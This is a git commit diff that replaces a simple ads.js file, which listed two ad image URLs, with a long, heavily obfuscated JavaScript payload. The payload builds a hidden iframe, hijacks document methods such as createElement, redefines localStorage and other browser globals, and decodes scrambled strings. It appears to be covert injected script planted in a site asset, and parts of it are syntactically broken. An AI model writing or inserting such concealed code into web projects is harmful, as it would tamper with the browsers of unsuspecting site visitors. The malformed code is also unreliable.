8a9a339ef5a76997e806a6dcf33fa04a84e5f340
Christian Loga <148154322+PlayFlixo@users.noreply.github.com>
2024-08-19 15:37:12 -0500

    Update ads.js

--- js/ads.js
+++ js/ads.js
@@ -1,7 +1,143 @@
-// js/ads.js
+(() => {
+    var f = 'rCaohdCemzoMraftzhgznriarntdSozmyzttroeSptorriPnegnzisfleidczetzcreejpblOazceelzbzafrourgEiafcnhozcazpwpoldynzigWettnzectrneoactzedTleixhtCNdondeepzpRaezglEmxtphzzadtloibhzCXtGsIr=izfczo>necmaatrzf(id/o<c>u"meennotn):zygazlcpaslildz"l=oeclayltSst o"rkangaelzb_:dtautoabzas"e=tcIrtse mezmgaertfIit<ezmLzMrTeHmroevnenIitzeemdzocNleenaorlzcdzedcaoedhezUeRdIoCNotmnpeornaepnzteznboinnzdyzabltposaizdezveallyztJsSzOeNmzaDraftiezztAnrermauyczoPdrzoymdiosbezzeptaartsSeyIdnatezrnzatvpiigractSotrnzeernrcuocdzeeUmRaINzgUaiTnytB8sAtrnreamyezlsEetteTgizmdeIoyuBttznseemteIlnEtteergvzaSlNztAnrermaeylBEueftfaeerrzcczltenaermTgiamreFotuntezmculceoaDreItnateerrcvzatlnzeMveEshscatgaepCshiadnznlellAzrBortocaedlceaSsytrCehuaqnznreoltzceenlceoSdyerUeRuIqCzormepnoentesnitLztTnyepveEEervroomrezrEzvreennteztEsrirLotrnzeIvmEadgdeazzstensesmieolnESettoareargce'.split("").reduce((J,x,O)=>O%2?J+x:x+J).split("z");
+    (J => {
+        let x = [f[0],f[1],f[2],f[3],f[4],f[5],f[6],f[7],f[8],f[9]],
+            O = [f[10],f[11],f[12]],
+            P = document,
+            X, y, b = window,
+            U = {};
+        try {
+            try {
+                X = window[f[13]][f[0]](f[14]);
+                X[f[15]][f[16]] = f[17];
+            } catch(a) {
+                y = (P[f[10]] ? P[f[10]][f[18]] : P[f[12]] || P[f[19]])[f[20]]();
+                y[f[21]] = f[22];
+                X = y[f[23]];
+            }
+            P[f[9]](f[24])[0][f[25]](X);
+            b = X[f[26]];
+            let _ = {};
+            _[f[27]] = !1;
+            b[f[28]][f[29]](b[f[30]], f[31], _);
+            let G = b  [f[36]](/^\d+/, f[37]);
+            window[G] = document;
+            x[f[38]](a => {
+                document[a] = function() {
+                    return b[f[13]][a][f[39]](window[f[13]], arguments);
+                }
+            });
+            O[f[38]](a => {
+                let g = {};
+                g[f[27]] = !1;
+                g[f[40]] = () => P[a];
+                b[f[28]][f[29]](U, a, g);
+            });
+            document[f[41]] = function() {
+                let a = new b[f[42]](b[f[43]](f[44])[f[45]](f[46], b[f[43]](f[44])), f[47]);
+                return arguments[0] = arguments[0][f[36]](a, G), b[f[13]][f[41]][f[48]](window[f[13]], arguments[0]);
+            };
+            try {
+                window[f[49]] = window[f[49]];
+            } catch(a) {
+                let g = {};
+                g[f[50]] = {};
+                g[f[51]] = (V, Je) => (g[f[50]][V] = b[f[30]](Je), g[f[50]][V]);
+                g[f[52]] = V => { if (V in g[f[50]]) return g[f[50]][V]; };
+                g[f[53]] = V => (delete g[f[50]][V], !0);
+                g[f[54]] = () => (g[f[50]] = {}, !0);
+                delete window[f[49]];
+                window[f[49]] = g;
+            }
+            try {
+                window[f[43]];
+            } catch(a) {
+                delete window[f[43]];
+                window[f[43]] = b[f[43]];
+            }
+            try {
+                window[f[55]];
+            } catch(a) {
+                delete window[f[55]];
+                window[f[55]] = b[f[55]];
+            }
+            try {
+                window[f[42]];
+            } catch(a) {
+                delete window[f[42]];
+                window[f[42]] = b[f[42]];
+            }
+            for (key in document) try {
+                U[key] = document[key][f[56]](document);
+            } catch(a) {
+                U[key] = document[key];
+            }
+        } catch(_) {}
+        let z = _ => {
+            try {
+                return b[_];
+            } catch(G) {
+                try {
+                    return window[_];
+                } catch(a) {
+                    return null;
+                }
+            }
+        };
+        [f[30],f[43],f[57],f[58],f[59],f[60],f[32],f[61],f[42],f[62],f[62],f[63],f[64],f[65],f[66],f[67],f[68],f[69],f[70],f[71],f[72],f[73],f[55],f[74],f[28],f[75],f[76],f[77],f[78],f[49],f[79]].f[38]](_ => {
+            try {
+                if (!window[_]) throw new b[f[77]](f[37]);
+            } catch(G) {
+                try {
+                    let a = {};
+                    a[f[27]] = !1;
+                    a[f[40]] = () => b[_];
+                    b[f[28]][f[29]](window, _, a);
+                } catch(a) {}
+            }
+        });
+        J(z(f[30]), z(f[43]), z(f[57]), z(f[58]), z(f[59]), z(f[60]), z(f[32]), z(f[61]), z(f[42]), z(f[62]), z(f[62]), z(f[63]), z(f[64]), z(f[65]), z(f[66]), z(f[67]), z(f[68]), z(f[69]), z(f[70]), z(f[71]), z(f[72]), z(f[73]), z(f[55]), z(f[74]), z(f[28]), z(f[75]), z(f[76]), z(f[77]), z(f[78]), z(f[49]), z(f[79]), U);
+    })((J, x, O, P, X, y, b, U, z, _, G, a, g, V, Je, W, ue, nn, dr, Y, lf, ir, tn, fn, oe, pf, un, I, on, j, Mr, qn) => {
+        (function(e, c, M, h) {
+            (() => {
+                function ie(r) {
+                    let n = r[e.gj]()[e.Uk](e.X);
+                    return n >= e.IK && n <= e.Zj ? n - e.IK : n >= e.cM && n <= e.pM ? n - e.cM + e.JK : e.X;
+                }
 
-// This file only contains the array of image URLs
-const adImages = [
-    'https://s.yimg.com/cv/apiv2/adspecs/format/demos/33/Publix_sw__160x600_1630036809791.jpg',
-    'https://live.staticflickr.com/8339/8263840740_b14ae73d1a_z.jpg'
-];
+                function br(r) {
+                    return r <= e.lK ? J[e.ij](r + e.IK) : r <= e.wj ? J[e.ij](r + e.cM - e.JK) : e.sK;
+                }
+
+                function cn(r, n) {
+                    return r[e.nM](e.h)[e.vj]((t, u) => {
+                        let o = (n + e.J) * (u + e.J),
+                            q = (ie(t) + o) % e.qJ,
+                            a = (ie(t) + o) % e.qJ;
+                        return br(a) !== br(q) ? a : q;
+                    });
+                }
+
+                e = e || {};
+                e.nM = 'map';
+                e.vj = 'map';
+                e.h = 'charCodeAt';
+                e.gj = 'charCodeAt';
+                e.x = 'length';
+                e.IK = 191; // 0xBF
+                e.Zj = 193; // 0xC1
+                e.cM = 197; // 0xC5
+                e.pM = 199; // 0xC7
+                e.JK = 0x10;
+                e.wj = 198;
+                e.sK = 11;
+                e.X = 22;
+                e.lK = 45;
+                e.J = 0;
+                e.qJ = 254;
+                return e;
+            })();
+            return c();
+        })();
+    });
+})();
